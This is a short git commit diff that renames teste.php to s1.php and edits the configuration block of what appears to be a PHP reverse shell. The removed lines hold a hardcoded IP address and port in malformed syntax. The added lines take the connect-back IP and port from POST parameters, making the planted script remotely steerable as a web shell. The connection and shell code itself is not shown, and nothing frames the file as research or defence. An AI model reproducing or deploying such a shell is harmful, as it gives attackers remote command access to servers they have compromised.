e295daab04d403a313fce4f3b30830f82834293e
Cr4sHBR <du.simionato@gmail.com>
2021-04-07 15:24:52 -0300

    Update and rename teste.php to s1.php

--- s1.php
+++ s1.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '$_POST['104.214.36.7']';  // CHANGE THIS
-$port = $_POST['4321'];       // CHANGE THIS
+$ip = $_POST['ip'];  // CHANGE THIS
+$port = $_POST['p'];       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
